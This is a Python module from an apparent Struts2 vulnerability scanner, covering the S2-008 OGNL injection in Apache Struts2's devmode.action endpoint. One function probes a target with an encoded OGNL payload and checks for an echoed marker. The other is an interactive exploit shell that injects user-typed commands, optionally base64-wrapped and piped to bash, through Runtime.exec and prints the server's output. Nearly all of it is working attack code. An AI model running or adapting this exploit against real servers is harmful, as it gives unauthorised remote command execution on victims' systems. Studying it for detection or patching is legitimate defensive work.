#!/usr/bin/env python
# coding=utf-8
import base64
import urllib
import requests
import urllib3
urllib3.disable_warnings()
from cve.Struts.Struts2scan_main.module.proxy import proxies
from cve.Struts.Struts2scan_main.module.color import color
from requests.exceptions import ConnectionError
from requests.exceptions import ConnectTimeout
from requests.exceptions import Timeout
import re

def s2_008(url):
    print("[*] 开始检测S2-008")
    vul_nname = "s2_008"
    headers = {
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69",
    }
    path = "/devmode.action?debug=command&expression=%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23resp%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2c%23resp.getWriter%28%29.println%28%27thanks6%27%2b%2786786786%27%29%2c%23resp.getWriter%28%29.flush%28%29%2c%23resp.getWriter%28%29.close%28%29"
    try:
        vurl = urllib.parse.urljoin(url, path)
        req = requests.get(vurl, headers=headers, timeout=15, verify=False,proxies = proxies)
        if r"thanks686786786" in req.text:
            print(color.red("[+]")+"存在漏洞：%s" % vul_nname)
    except:
        pass


def s2_008_exp(url):
    try:
        cmdtype = input("命令模式：[1]默认;[2*]base64 : ")
    except:exit()

    if cmdtype == "2":
        print("[2]base64命令模式")
    else:
        print("[1]默认模式")

    while 1:
        try:
            cmd = input("> ")
            if cmd == '':continue
            if cmd == 'exit':exit()
        except:exit()
        if cmdtype == "2":
            cmd = "bash -c {echo,"+str(base64.b64encode(cmd.encode('utf-8')),'utf-8')+"}|{base64,-d}|{bash,-i}"
            cmd = cmd.replace('+','%2B')
        cmd = cmd.replace(' ','+')
        headers = {
            "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69",
        }
        path = "/devmode.action?debug=command&expression=(%23_memberAccess[%22allowStaticMethodAccess%22]%3dtrue%2c%23foo%3dnew+java.lang.Boolean(%22false%22)+%2c%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3d%23foo%2c%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(%27"+cmd+"%27).getInputStream()))"
        try:
            vurl = urllib.parse.urljoin(url, path)
            req = requests.get(vurl, headers=headers, timeout=15, verify=False,proxies = proxies)
            print(req.text)
        except ConnectionError as e:  
            print("[!]网络链接错误/代理异常")
            exit()
        except ConnectTimeout as e:  
            print("[!]连接远程服务器超时异常")
            exit()
        except Timeout as e:  
            print("[!]请求URL超时，产生超时异常")
            exit()
        except:pass
    


